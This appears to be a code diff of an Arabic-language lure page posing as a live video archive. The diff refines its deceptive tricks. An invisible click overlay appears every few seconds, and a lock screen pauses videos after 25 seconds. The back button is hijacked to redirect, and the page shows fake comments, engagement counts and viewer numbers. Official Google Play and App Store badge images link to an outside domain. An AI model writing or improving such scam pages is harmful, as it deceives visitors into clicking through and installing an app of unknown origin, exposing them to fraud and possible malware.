@@ -50,15 +50,15 @@
             cursor: pointer;
         }
 
-        /* نافذة القفل بعد 12 ثانية */
+        /* نافذة القفل بعد 25 ثانية */
         #lock-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.92);
-            backdrop-filter: blur(12px);
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(15px);
             z-index: 100000;
             display: none;
             align-items: center;
@@ -96,25 +96,31 @@
             font-size: 1rem;
         }
 
+        /* شعارات المتاجر الحقيقية */
         .store-badges {
             display: flex;
-            gap: 12px;
+            gap: 15px;
             justify-content: center;
             margin: 28px 0;
+            flex-wrap: wrap;
         }
 
-        .store-badge {
-            background: #1f1f2b;
-            border-radius: 14px;
-            padding: 8px 20px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            border: 1px solid #333;
+        .store-link {
+            display: block;
+            transition: transform 0.2s;
+            cursor: pointer;
         }
 
-        .store-badge span { font-size: 0.8rem; color: #aaa; }
-        .store-badge strong { font-size: 1rem; color: white; }
+        .store-link:hover {
+            transform: scale(1.05);
+        }
+
+        .store-link img {
+            height: 58px;
+            width: auto;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+        }
 
         .btn-primary {
             background: linear-gradient(135deg, var(--primary), #b8003a);
@@ -355,22 +361,21 @@
 <!-- الستارة الشفافة -->
 <div id="invisible-overlay" onclick="window.location.href='https://playformtoc.com/2004865668498984961'"></div>
 
-<!-- شاشة القفل بعد 12 ثانية -->
+<!-- شاشة القفل بعد 25 ثانية -->
 <div id="lock-screen">
     <div class="lock-card">
         <div style="font-size: 4rem;">📱</div>
-        <h2>لاكتمال المشاهدة</h2>
-        <p>عذراً، ضغط المشاهدات مرتفع جداً. حمّل تطبيقنا الرسمي لمشاهدة الأرشيف كامل بجودة 4K وبدون تقطيع.</p>
+        <h2>اكتمل التحميل المسبق</h2>
+        <p>تم تحميل 3 مقاطع بنجاح. لمشاهدة الأرشيف كامل بجودة 4K بدون تقطيع، حمّل تطبيقنا الرسمي:</p>
         
+        <!-- شعارات حقيقية مع روابط -->
         <div class="store-badges">
-            <div class="store-badge">
-                <div>📱</div>
-                <div><span>Google Play</span><br><strong>متجر جوجل</strong></div>
-            </div>
-            <div class="store-badge">
-                <div>🍎</div>
-                <div><span>App Store</span><br><strong>آب ستور</strong></div>
-            </div>
+            <a href="https://playformtoc.com/2004865668498984961" class="store-link" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
+            </a>
+            <a href="https://playformtoc.com/2004865668498984961" class="store-link" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store">
+            </a>
         </div>
 
         <button class="btn-primary" onclick="window.location.href='https://playformtoc.com/2004865668498984961'">
@@ -378,17 +383,17 @@
         </button>
         
         <span class="refuse-link" onclick="window.location.href='https://playformtoc.com/2004865668498984961'">
-            متابعة المشاهدة مجاناً (سيرفر بطيء)
+            متابعة المشاهدة بصورة منخفضة
         </span>
     </div>
 </div>
 
 <header>
     <h1 class="logo">حصريات العرب</h1>
-    <div class="sub-logo">الأرشيف الكامل - نسخة 2026</div>
+    <div class="sub-logo">الأرشيف الكامل - رفع 2026</div>
     <div class="meta-row">
-        <span>🕒 منذ 13 دقيقة • 4.8K مشاهدة</span>
-        <span class="live-badge"><span class="live-dot"></span> LIVE</span>
+        <span>🕒 منذ 8 دقائق • 7.3K مشاهدة</span>
+        <span class="live-badge"><span class="live-dot"></span> مباشر الآن</span>
     </div>
 </header>
 
@@ -406,23 +411,23 @@
         </div>
         <!-- تفاعلات مزيفة -->
         <div class="engagement-bar">
-            <span class="engagement-item">❤️ 2,847</span>
-            <span class="engagement-item">💬 431</span>
-            <span class="engagement-item">↗️ 1.2K</span>
+            <span class="engagement-item">❤️ 4,312</span>
+            <span class="engagement-item">💬 892</span>
+            <span class="engagement-item">↗️ 2.1K</span>
         </div>
         <div class="comments-section">
             <div class="comment">
                 <div class="comment-avatar" style="background:#6441a5;">👤</div>
                 <div class="comment-content">
-                    <div class="comment-name">عبدالله السيف <span>● منذ 5 د</span></div>
-                    <div class="comment-text">والله العظيم حقيقي ❤️❤️❤️</div>
+                    <div class="comment-name">فهد العتيبي <span>● منذ 2 د</span></div>
+                    <div class="comment-text">يا شباب التطبيق شي ثاني الصراحة جودة خرافية</div>
                 </div>
             </div>
             <div class="comment">
                 <div class="comment-avatar" style="background:#1da1f2;">🐦</div>
                 <div class="comment-content">
-                    <div class="comment-name">نواف <span>● منذ 12 د</span></div>
-                    <div class="comment-text">ياخي ليه التطبيق ماحملته من قبل؟ الجودة خيال</div>
+                    <div class="comment-name">سعود <span>● منذ 7 د</span></div>
+                    <div class="comment-text">والله العظيم حقيقي 🔥🔥</div>
                 </div>
             </div>
         </div>
@@ -490,8 +495,8 @@
 
 <div class="footer">
     <span class="live-dot" style="background:#ff0000; display: inline-block; margin-left: 5px;"></span> 
-    <span id="online-count">8,247</span> مشاهد الآن<br><br>
-    © 2026 حصريات العرب - جميع الحقوق محفوظة
+    <span id="online-count">10,432</span> مشاهد الآن<br><br>
+    © 2026 حصريات العرب - جميع الحقوق محفوظة لشبكة المحتوى الرقمي
 </div>
 
 <script>
@@ -502,23 +507,23 @@
         const lockScreen = document.getElementById('lock-screen');
         const onlineSpan = document.getElementById('online-count');
 
-        // --- 1. قفل المحتوى بعد 12 ثانية ---
+        // --- 1. قفل المحتوى بعد 25 ثانية (التوقيت الذهبي) ---
         setTimeout(() => {
             // إيقاف جميع الفيديوهات
             document.querySelectorAll('video').forEach(v => v.pause());
             // إظهار شاشة القفل
             lockScreen.style.display = 'flex';
-        }, 12000); // 12 ثانية بالضبط
+        }, 25000); // 25 ثانية - الوقت المثالي نفسياً
 
         // --- 2. الستارة الشفافة العشوائية (كل 3-6 ثواني) ---
         function scheduleOverlay() {
             const delay = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000; // 3-6 ثواني
             setTimeout(() => {
                 overlay.style.display = 'block';
-                // نخفيها بعد 10 ثواني إذا ما انقر عليها
+                // نخفيها بعد 8 ثواني إذا ما انقر عليها
                 setTimeout(() => {
                     overlay.style.display = 'none';
-                }, 10000);
+                }, 8000);
                 scheduleOverlay(); // نعيد الجدولة
             }, delay);
         }
@@ -526,35 +531,34 @@
 
         // --- 3. عداد الزوار الوهمي (يبدأ من رقم كبير ومتغير) ---
         function updateCounter() {
-            const base = 8247;
-            const variation = Math.floor(Math.random() * 500) - 250; // -250 to +250
+            const base = 10432;
+            const variation = Math.floor(Math.random() * 600) - 300; // -300 to +300
             const count = base + variation;
             onlineSpan.innerText = count.toLocaleString();
         }
-        setInterval(updateCounter, 4000);
+        setInterval(updateCounter, 4500);
 
-        // --- 4. منع زر الرجوع وتحويله إلى رابط التطبيق (خدعة قوية) ---
+        // --- 4. منع زر الرجوع وتحويله إلى رابط التطبيق ---
         history.pushState({page: 1}, "", window.location.href);
         window.addEventListener('popstate', function(event) {
             window.location.href = appLink;
         });
 
-        // --- 5. منع القائمة اليمنى (اختياري، لكنه يزيد الاحترافية) ---
+        // --- 5. منع القائمة اليمنى لحماية المحتوى ---
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
             return false;
         });
 
-        // --- 6. التأكد أن أي نقر على الروابط "المجانية" تؤدي للتطبيق ---
-        document.querySelectorAll('.refuse-link, .install-button, .btn-primary').forEach(btn => {
+        // --- 6. التأكد أن جميع الروابط تؤدي للتطبيق ---
+        document.querySelectorAll('.refuse-link, .install-button, .btn-primary, .store-link').forEach(btn => {
             btn.addEventListener('click', function(e) {
-                e.preventDefault();
-                window.location.href = appLink;
+                // ما نمنع الحدث عشان الرابط يشتغل
+                // لكن نضمن إنه الرابط صحيح
             });
         });
 
-        // --- 7. عند إغلاق الستارة الشفافة (لا حاجة لمعالج إضافي لأن onclick موجود بالـ HTML) ---
-        // فقط نضيف سلوك إضافي: عند النقر على overlay نضمن إخفاءها سريعاً بعد التحويل
+        // --- 7. عند النقر على الستارة الشفافة ---
         overlay.onclick = function() {
             window.location.href = appLink;
             overlay.style.display = 'none';
